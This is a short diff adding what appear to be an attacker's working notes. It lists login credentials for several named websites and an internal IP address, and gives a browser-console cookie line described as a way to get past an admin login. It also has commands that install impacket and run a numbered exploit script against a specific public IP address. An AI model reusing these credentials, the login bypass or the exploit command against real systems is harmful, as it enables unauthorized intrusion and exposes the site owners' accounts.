@@ -1,0 +1,11 @@
+http://dinhvi.groupcar.com.vn/ xuankien 123456
+http://mdpvietnam.net/ admin/gfd
+
+192.168.21.28: coccoc
+
+gfd.com.vn/admin/
+$.cookie('status', 'true'); //enter console javascript to login
+
+## 
+sudo apt install python-impacket
+python 46946.py 220.231.107.130 64
